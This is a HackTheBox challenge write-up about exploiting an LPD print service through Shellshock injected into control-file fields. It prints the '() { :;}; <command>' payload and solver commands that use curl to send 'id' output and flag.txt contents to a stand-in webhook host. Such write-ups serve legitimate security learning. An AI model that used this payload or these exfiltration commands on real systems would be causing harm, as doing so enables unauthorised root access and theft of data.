---
title: "Hardware - line"
date: 2026-05-10
tags: ["HackTheBox", "Hardware"]
categories: ["Machines&Challenges"]
author: "z3r0s"
---
# Hardware Line

Target: `154.57.164.83:31804`

## Summary

The service on `31804/tcp` speaks LPD. The queue name `lp` is accepted, and the implementation is vulnerable to command execution via Shellshock in user-controlled LPD control-file fields.

The working primitive is:

```text
() { :;}; <command>
```

That payload can be injected into the control-file fields and filenames during a standard LPD `Receive a printer job` request.

## What Worked

The following checks were confirmed during exploitation:

- LPD queue `lp` is valid.
- Arbitrary-looking control/data filenames are accepted.
- Shellshock command execution works.
- The target executes commands as `root`.
- The host reports:
  - `whoami` -> `root`
  - `pwd` -> `/`
  - `uname` -> `Linux`
  - `hostname` -> `ng-2418277-hwline-x0phm-d447b54b9-2pxhq`
- Listing `/opt` returned `flag.txt`.

## Reusable Solver

Use [solver.py](/home/kali/HTB/HARDWARE_CHALLENGES/hardware_line/solver.py) and change the command as needed.

Example:

```bash
python3 solver.py 154.57.164.83 --port 31804 --command 'curl -s https://your-webhook.site/?x=$(id)'
```

To work from `/opt` without hardcoding the full path:

```bash
python3 solver.py 154.57.164.83 --port 31804 --command 'cd /opt; cat flag.txt'
```

If you need to exfiltrate safely through HTTP, prefer encoding:

```bash
python3 solver.py 154.57.164.83 --port 31804 --command 'cd /opt; curl -sG --data-urlencode x@flag.txt https://your-webhook.site/token'
```

## Notes

- Direct command output did not come back over the same LPD socket in my testing.
- Webhook-based exfiltration worked reliably for simple command output like `id`, `whoami`, `pwd`, `uname`, and `hostname`.
- The flag file location was identified as `/opt/flag.txt` from directory listing output.
